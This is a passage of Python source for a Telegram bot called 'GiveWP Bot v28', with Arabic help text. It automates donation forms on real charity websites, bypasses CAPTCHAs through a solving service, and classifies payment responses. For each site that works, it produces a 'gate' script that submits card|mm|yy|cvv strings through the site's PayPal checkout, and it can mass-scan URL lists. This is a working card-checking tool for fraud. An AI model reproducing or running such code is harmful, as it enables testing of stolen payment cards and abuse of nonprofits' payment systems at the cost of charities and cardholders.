                    try: await btn.click(timeout=3000)
                    except: await btn.click(force=True, timeout=3000)
                    return True
            except: continue
        return False

    async def _read(self, page, frame):
        # 1. PayPal network
        for body in self.debug["paypal"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": body[:2000], "debug": self.debug}
            if cd == "PAYPAL_ORDER_MISSING": return {"status": "DEAD", "code": cd, "raw": body[:2000], "debug": self.debug}

        # 2. Stripe network
        for body in self.debug["stripe"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": body[:2000], "debug": self.debug}

        # 3. All network
        for net in self.debug["network"]:
            st, cd = Cls.classify(net.get("body", ""))
            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": net["body"][:2000], "debug": self.debug}

        # 4. Page text
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            try:
                t = await fr.inner_text("body")
                if t:
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": t[:2000], "debug": self.debug}
            except: continue

        # 5. Alerts
        try:
            for fr in [frame, page.main_frame]:
                if not fr: continue
                for a in await fr.locator("[role='alert'],.give_error,.error,.alert").all():
                    t = await a.inner_text()
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": t[:2000], "debug": self.debug}
        except: pass

        # 6. raw
        if self.debug.get("raw"):
            st, cd = Cls.classify(self.debug["raw"])
            return {"status": st, "code": cd, "raw": self.debug["raw"][:2000], "debug": self.debug}

        return {"status": "UNKNOWN", "code": "NO_RESPONSE", "raw": "", "debug": self.debug}

    async def _solve_captcha(self, page, html):
        """يحل CAPTCHA بـ 2captcha (لو API key موجود)"""
        if not TWOCAPTCHA_KEY: return False
        try:
            # استخرج sitekey
            m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if not m:
                m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
            if not m: return False
            sitekey = m.group(1)

            # أرسل لـ 2captcha
            import requests as req
            r = req.post("https://2captcha.com/in.php", data={
                "key": TWOCAPTCHA_KEY, "method": "userrecaptcha",
                "googlekey": sitekey, "pageurl": self.url, "json": 1
            }, timeout=30).json()

            if r.get("status") != 1: return False
            task_id = r["request"]

            # انتظر الحل
            for _ in range(30):
                await asyncio.sleep(5)
                res = req.get(f"https://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={task_id}&json=1", timeout=30).json()
                if res.get("status") == 1:
                    token = res["request"]
                    # املأ الـ response
                    await page.evaluate(f"""
                        () => {{
                            const el = document.querySelector('[name="g-recaptcha-response"]');
                            if (el) el.value = "{token}";
                            if (window.___grecaptcha_cfg) {{
                                try {{ grecaptcha.getResponse = () => "{token}"; }} catch(e) {{}}
                            }}
                        }}
                    """)
                    return True
            return False
        except: return False
        
        # ═══════════════════════════════════════════════════════════════
# GATE FILE GENERATOR
# ═══════════════════════════════════════════════════════════════
GATE_TEMPLATE = '''"""
Gate: {domain}
Form: {form_id}
Amount: {amount}
Extracted: {ts}
Test: {test_card}
"""
import requests, re, base64, json, random, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder

META = "{meta}"
SDK = "{sdk}"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"


class PayPal:
    def __init__(self):
        self.url = "{url}"
        self.host = "{host}"
        self.path = "{path}"
        self.base = f"https://{{self.host}}"
        self.ajax = f"{{self.base}}/wp-admin/admin-ajax.php"
        self.form1 = "{form1}"
        self.form2 = "{form2}"
        self.nonce = "{nonce}"
        self.pid = "{pid}"
        self.amt = "{amount}"
        self.au = None
        self.r = requests.Session()
        self.r.verify = False

    def _tok(self):
        try:
            r = self.r.get(self.url, headers={{"user-agent": UA}}, timeout=20, cookies=self.r.cookies)
            self.r.cookies.update(r.cookies)
            m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', r.text)
            if m:
                dec = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                au = re.search(r'"accessToken":"([^"]+)"', dec)
                if au: self.au = au.group(1); return True
            m = re.search(r'"accessToken"\\s*:\\s*"([^"]{{20,}})"', r.text)
            if m: self.au = m.group(1); return True
        except: pass
        return False

    def _data(self):
        return MultipartEncoder({{
            "give-honeypot": (None,""),
            "give-form-id-prefix": (None, self.form1),
            "give-form-id": (None, self.form2),
            "give-form-title": (None,""),
            "give-current-url": (None, self.url),
            "give-form-url": (None, self.url),
            "give-form-minimum": (None,"5.00"),
            "give-form-maximum": (None,"999999.99"),
            "give-form-hash": (None, self.nonce),
            "give-price-id": (None, self.pid),
            "give-amount": (None, self.amt),
            "payment-mode": (None,"paypal-commerce"),
            "give-gateway": (None,"paypal-commerce"),
            "give_first": (None, random.choice(["James","John"])),
            "give_last": (None, random.choice(["Smith","Johnson"])),
            "give_email": (None, f"u{{random.randint(1000,99999)}}@gmail.com"),
            "card_name": (None,"Test"),
        }})

    def _create(self):
        d = self._data()
        h = {{"content-type": d.content_type,"origin": self.base,"referer": self.url,"user-agent": UA}}
        try:
            r = self.r.post(self.ajax, params={{"action":"give_paypal_commerce_create_order"}},
                           headers=h, data=d, cookies=self.r.cookies, timeout=20)
            js = r.json()
            if isinstance(js.get("data"),dict) and js["data"].get("id"): return js["data"]["id"]
        except: pass
        return None

    def _confirm(self, oid, cc):
        p = cc.strip().split("|")
        n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
        if "20" in yy: yy = yy.split("20")[1]
        if len(yy) == 4: yy = yy[2:]
        h = {{
            "authority":"cors.api.paypal.com","accept":"*/*",
            "authorization":f"Bearer {{self.au}}",
            "braintree-sdk-version":SDK,"content-type":"application/json",
            "origin":"https://assets.braintreegateway.com",
            "paypal-client-metadata-id":META,
            "referer":"https://assets.braintreegateway.com/",
            "user-agent":UA,
        }}
        j = {{"payment_source":{{"card":{{"number":n,"expiry":f"20{{yy}}-{{mm}}",
              "security_code":cvc,"attributes":{{"verification":{{"method":"SCA_WHEN_REQUIRED"}}}}}}}},
              "application_context":{{"vault":False}}}}
        try: return self.r.post(f"https://cors.api.paypal.com/v2/checkout/orders/{{oid}}/confirm-payment-source",
                                headers=h, json=j, timeout=20)
        except: return None

    def _approve(self, oid):
        d = self._data()
        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
        try:
            return self.r.post(self.ajax, params={{"action":"give_paypal_commerce_approve_order","order":oid}},
                              headers=h, data=d, cookies=self.r.cookies, timeout=20)
        except: return None

    def charge(self, cc):
        if not self._tok(): return {{"status":"DEAD","code":"NO_TOKEN","raw":""}}
        oid = self._create()
        if not oid: return {{"status":"DEAD","code":"CREATE_FAILED","raw":""}}
        cr = self._confirm(oid, cc)
        if cr and cr.status_code in (400,422):
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY",
                      "EXPIRED_CARD","CVV2_FAILURE","DO_NOT_HONOR","GENERIC_DECLINE"]:
                if c in cr.text.upper(): return {{"status":"LIVE","code":c,"raw":cr.text[:500]}}
        ar = self._approve(oid)
        if ar:
            try:
                js = json.loads(ar.text)
                if js.get("success") is True: return {{"status":"LIVE","code":"CHARGE_SUCCESS","raw":ar.text[:500]}}
            except: pass
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY","CHARGE_SUCCESS"]:
                if c in ar.text.upper(): return {{"status":"LIVE","code":c,"raw":ar.text[:500]}}
        return {{"status":"DEAD","code":"FAILED","raw":""}}


if __name__ == "__main__":
    p = PayPal()
    r = p.charge("{test_card}")
    print(f"Status: {{r['status']}}")
    print(f"Code: {{r['code']}}")
    print(f"Raw: {{r['raw'][:300]}}")
'''


def gen_gate(url, dbg, card):
    info = dbg.get("extracted", {})
    p = urlparse(url)
    return GATE_TEMPLATE.format(
        domain=p.netloc, form_id=info.get("form_id", "?"),
        amount=dbg.get("amount", "5.00"), ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        test_card=card, meta=PAYPAL_META, sdk=BRAINTREE_SDK,
        url=url, host=p.netloc, path=p.path + ("?" + p.query if p.query else ""),
        form1=info.get("form1", ""), form2=info.get("form2", ""),
        nonce=info.get("nonce", ""), pid=info.get("price_id", "3"),
    )


# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
def start_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 You are blocked."); return
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    text = f"""<b>⚡ GiveWP Bot v28</b>

<b>Name:</b> {msg.from_user.first_name}
<b>ID:</b> <code>{msg.from_user.id}</code>

━━━━━━━━━━━━━━━━━━━━
[⚡] /paypal <code>&lt;url&gt;</code>
[⚡] /mass — ملف روابط
[⚡] /test — فحص سريع
[⚡] /stop — إيقاف
━━━━━━━━━━━━━━━━━━━━
🔥 Legendary Edition
📄 Auto Gate Files"""
    safe_send(msg.chat.id, text, kb)


@bot.callback_query_handler(func=lambda c: c.data == "help")
def cb_help(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    text = """<b>📖 المساعدة</b>

<b>الأوامر:</b>
<code>/paypal URL</code> — فحص موقع
<code>/mass</code> — فحص ملف
<code>/test</code> — فحص سريع
<code>/stop</code> — إيقاف

<b>البوت يعمل:</b>
✅ يفتح المتصفح
✅ يستخرج الفورم (5 طبقات)
✅ يملأ كل الحقول
✅ يختار مبلغ (14 مبلغ)
✅ يضغط تبرع (17 استراتيجية)
✅ يدخل PayPal/Stripe
✅ يصنف 100+ كود رد
✅ يبعت ملف Gate

<b>النتائج:</b>
✅ LIVE — كارت اترفض (رد حقيقي)
❌ DEAD — فشل/gateway معطل"""
    try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
    except: pass


@bot.callback_query_handler(func=lambda c: c.data == "fb")
def cb_fb(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))
    try: bot.edit_message_text("💬 <b>Feedback</b>\n\nSend your message:",
                               call.message.chat.id, call.message.message_id, reply_markup=kb)
    except: pass
    waiting_users[call.from_user.id] = True


@bot.callback_query_handler(func=lambda c: c.data == "back")
def cb_back(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    try: bot.edit_message_text("<b>⚡ GiveWP Bot</b>\n\nUse /start",
                               call.message.chat.id, call.message.message_id, reply_markup=kb)
    except: pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and not (m.text or "").startswith("/"))
def handle_fb(msg):
    waiting_users.pop(msg.from_user.id, None)
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"r_{msg.from_user.id}"))
    safe_send(OWNER_ID, f"📩 <b>Feedback</b>\nFrom: {msg.from_user.first_name}\nID: <code>{msg.from_user.id}</code>\n\n{msg.text[:500]}", kb)
    safe_send(msg.chat.id, "✅ Sent!")


@bot.callback_query_handler(func=lambda c: c.data.startswith("r_"))
def cb_reply(call):
    uid = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = uid
    try: bot.answer_callback_query(call.id)
    except: pass
    safe_send(call.from_user.id, "Write your reply:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_reply(msg):
    uid = reply_mode.pop(msg.from_user.id, None)
    if uid:
        safe_send(uid, f"<b>Admin:</b>\n\n{msg.text}")
        safe_send(msg.from_user.id, "✅ Sent")


@bot.message_handler(commands=["paypal"])
def paypal_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    parts = (msg.text or "").split(maxsplit=1)
    if len(parts) != 2:
        safe_send(msg.chat.id, "❌ /paypal URL"); return
    url = parts[1].strip()
    if not url.startswith(("http://", "https://")):
        safe_send(msg.chat.id, "❌ Invalid URL"); return

    sm = safe_send(msg.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
    if not sm: return

    def run():
        t0 = time.time()
        try:
            r = check(url, TEST_CARD)
            dt = time.time() - t0
            st, code, raw = r["status"], r["code"], r.get("raw", "")
            dbg = r.get("debug", {})

            if st == "LIVE":
                gate = gen_gate(url, dbg, TEST_CARD)
                host = urlparse(url).netloc.replace(".", "_")
                fn = f"gate_{host}_{int(time.time())}.py"
                safe_doc(msg.chat.id, gate.encode(), fn, f"✅ Gate: {fn}")

                info = dbg.get("extracted", {})
                report = f"""✅ <b>𝐆𝐚𝐭𝐞 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝!</b>
━━━━━━━━━━━━━━━━━
[⚡] <b>Domain:</b> <code>{urlparse(url).netloc}</code>
[⚡] <b>Form ID:</b> <code>{info.get("form_id", "?")}</code>
[⚡] <b>Amount:</b> <code>${dbg.get("amount", "?")}</code>
[⚡] <b>Platform:</b> <code>{dbg.get("platform", "?")}</code>
[⚡] <b>Time:</b> <code>{datetime.now().strftime("%H:%M:%S")}</code>
━━━━━━━━━━━━━━━━━
🧪 <b>Gate Test:</b>
[⚡] <b>Card:</b> <code>{TEST_CARD[:10]}****</code>
[⚡] <b>Response:</b> <code>{code}</code>
[⚡] <b>Status:</b> ✅ LIVE
[⚡] <b>Elapsed:</b> <code>{dt:.1f}s</code>
━━━━━━━━━━━━━━━━━
[⚡] 📄 <b>Ready!</b>
[⚡] 📝 <b>Function:</b> <code>(cc)</code>
[⚡] 📌 <b>Format:</b> <code>cc|mm|yy|cvv</code>"""
                safe_edit(msg.chat.id, sm.message_id, report)
            else:
                txt = f"❌ <b>{st}</b> | <code>{code}</code>\n\n🔗 <code>{url[:100]}</code>\n⏱️ {dt:.1f}s"
                if raw: txt += f"\n\n📝 <code>{raw[:400]}</code>"
                safe_edit(msg.chat.id, sm.message_id, txt)
        except Exception as e:
            safe_edit(msg.chat.id, sm.message_id, f"❌ {str(e)[:200]}")

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["test"])
def test_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    sites = [
        ("dandelions", "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
        ("stychno", "https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
        ("svdp", "https://svdpvenicefl.org/donations/donations/"),
    ]
    sm = safe_send(msg.chat.id, f"🔍 Testing {len(sites)}...")
    if not sm: return

    def run():
        results = []
        for n, u in sites:
            safe_edit(msg.chat.id, sm.message_id, f"🔍 {n}... ({len(results)}/{len(sites)})")
            r = check(u, TEST_CARD)
            results.append((n, r["status"], r["code"]))
        txt = "<b>📊 Results:</b>\n\n"
        for n, s, c in results:
            txt += f"{'✅' if s == 'LIVE' else '❌'} <b>{n}</b>: {c}\n"
        safe_edit(msg.chat.id, sm.message_id, txt)

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["mass"])
def mass_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    sm = safe_send(msg.chat.id, "📁 Send .txt file (URLs per line)")
    if sm: bot.register_next_step_handler(sm, handle_mass)


def handle_mass(msg):
    if not msg.document:
        safe_send(msg.chat.id, "❌ Not a file"); return
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        links = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
        if not links:
            safe_send(msg.chat.id, "❌ Empty"); return

        uid = msg.from_user.id
        chat = msg.chat.id
        total = len(links)
        processing_status[uid] = {"stop": False, "done": False, "live": 0, "dead": 0,
                                   "current": "", "total": total, "processed": 0}

        sm = safe_send(chat, f"📊 Scanning {total}...")
        if not sm: return

        def updater():
            last = ""
            while True:
                time.sleep(8)
                try:
                    if processing_status[uid]["done"]: break
                    st = processing_status[uid]
                    pct = int(st["processed"] / total * 100) if total else 0
                    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
                    txt = f"""📊 <b>Scanning...</b>
━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {st["live"]}
❌ Dead: {st["dead"]}
⏳ {pct}% {bar}
🔗 <code>{st["current"][:60]}</code>
━━━━━━━━━━━━━━━━━
⏱️ {st["processed"]}/{total}
🛑 /stop"""
                    if txt != last:
                        try: bot.edit_message_text(txt, chat, sm.message_id); last = txt
                        except: pass
                except: pass

        threading.Thread(target=updater, daemon=True).start()

        def worker():
            for i, link in enumerate(links):
                if processing_status[uid].get("stop"): break
                processing_status[uid]["current"] = link
                try:
                    r = check(link, TEST_CARD)
                    processing_status[uid]["processed"] += 1
                    if r["status"] == "LIVE":
                        processing_status[uid]["live"] += 1
                        gate = gen_gate(link, r.get("debug", {}), TEST_CARD)
                        host = urlparse(link).netloc.replace(".", "_")
                        fn = f"gate_{host}_{int(time.time())}.py"
                        safe_doc(chat, gate.encode(), fn, f"✅ {link[:60]}\n📄 {fn}")
                    else:
                        processing_status[uid]["dead"] += 1
                except: pass

            processing_status[uid]["done"] = True
            st = processing_status[uid]
            final = f"""📊 <b>Done!</b>
━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {st["live"]}
❌ Dead: {st["dead"]}
💯 Rate: {int(st["live"] / total * 100) if total else 0}%"""
            safe_edit(chat, sm.message_id, final)

        threading.Thread(target=worker, daemon=True).start()
    except Exception as e:
        safe_send(msg.chat.id, f"❌ {str(e)[:100]}")


@bot.message_handler(commands=["stop"])
def stop_cmd(msg):
    uid = msg.from_user.id
    if uid in processing_status:
        processing_status[uid]["stop"] = True
        safe_send(msg.chat.id, "🛑 Stopping...")
    else:
        safe_send(msg.chat.id, "❌ No active process")


@bot.message_handler(commands=["block2"])
def block_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫 No permission"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt", "a") as f: f.write(f"{uid}\n")
        safe_send(msg.chat.id, f"✅ Blocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /block2 ID")


@bot.message_handler(commands=["unblock2"])
def unblock_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫 No permission"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt") as f: lines = f.readlines()
        with open("blockusers.txt", "w") as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send(msg.chat.id, f"✅ Unblocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /unblock2 ID")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("🔥 GiveWP Bot v28 — LEGENDARY")
    print(f"Playwright: {'✅' if HAS_PW else '❌'}")
    print(f"2captcha: {'✅' if TWOCAPTCHA_KEY else '❌'}")
    print(f"Proxy: {'✅' if PROXY_URL else '❌'}")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except KeyboardInterrupt:
            print("⏹️ Stopped"); break
        except Exception as e:
            err = str(e)
            if "409" in err or "Conflict" in err:
                print(f"⚠️ 409 — waiting 15s"); time.sleep(15); continue
            print(f"❌ {err[:100]}"); time.sleep(5)
